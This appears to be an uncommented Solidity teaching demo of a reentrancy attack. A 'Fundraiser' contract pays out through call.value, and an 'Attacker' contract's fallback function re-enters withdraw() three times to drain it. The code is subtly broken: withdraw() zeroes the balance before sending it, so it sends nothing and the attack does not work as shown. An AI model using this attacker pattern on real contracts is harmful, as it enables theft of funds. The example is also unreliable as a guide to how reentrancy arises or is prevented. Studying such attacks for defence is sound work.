pragma solidity ^0.4.8;

contract Fundraiser{
    
    mapping  (address => uint) balances;
    
    function contribute() payable{
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(){
        if(balances[msg.sender] == 0){
            throw;
        }
        
        balances[msg.sender] = 0;
        msg.sender.call.value(balances[msg.sender])();
    }
    
    function getFunds() returns (uint){
        return address(this).balance;
    }
    
}





pragma solidity ^0.4.8;

import "./Fundraiser.sol";

contract Attacker{
    
    address public fundraiserAddress;
    uint public drainTimes = 0;
    
    function Attacker(address victimAddress){
        fundraiserAddress = victimAddress;
    }
 
    function() payable{
        if(drainTimes<3){
            drainTimes++;
            Fundraiser(fundraiserAddress).withdraw();
        }
    }
    
    function getFunds() returns (uint){
        return address(this).balance;
    }
    
    function payMe() payable{
        Fundraiser(fundraiserAddress).contribute.value(msg.value)();
    }
    
    function startScam(){
        Fundraiser(fundraiserAddress).withdraw();
    }
}
